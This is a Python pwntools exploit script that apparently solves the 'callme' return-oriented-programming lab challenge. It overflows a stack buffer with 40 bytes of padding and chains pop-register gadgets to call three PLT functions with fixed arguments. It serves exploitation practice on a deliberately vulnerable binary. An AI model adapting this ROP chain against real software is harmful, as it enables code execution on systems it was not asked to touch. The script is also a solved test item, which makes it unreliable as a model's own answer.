from pwn import ELF, gdb, process, p64   # type: ignore

'''target = gdb.debug(
    './callme',
    gdbscript='b *0x4008f0'
)'''
target = process('./callme')
elf = ELF('./callme')

callme_one = p64(0x0040092d)
callme_two = p64(0x00400919)
callme_three = p64(0x00400905)

callme_one_plt = elf.symbols['callme_one']
callme_two_plt = elf.symbols['callme_two']
callme_three_plt = elf.symbols['callme_three']

pop_rdi_ret = p64(0x00000000004009a3)
pop_rdx_ret = p64(0x000000000040093e)
pop_rdi_rsi_rdx_ret = p64(0x000000000040093c)
ret = p64(0x00000000004006be)

payload = b''
payload += b'A' * 40
payload += ret
payload += pop_rdi_rsi_rdx_ret
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(callme_one_plt)
payload += pop_rdi_rsi_rdx_ret
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(callme_two_plt)
payload += pop_rdi_rsi_rdx_ret
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(callme_three_plt)
target.sendline(payload)
target.interactive()
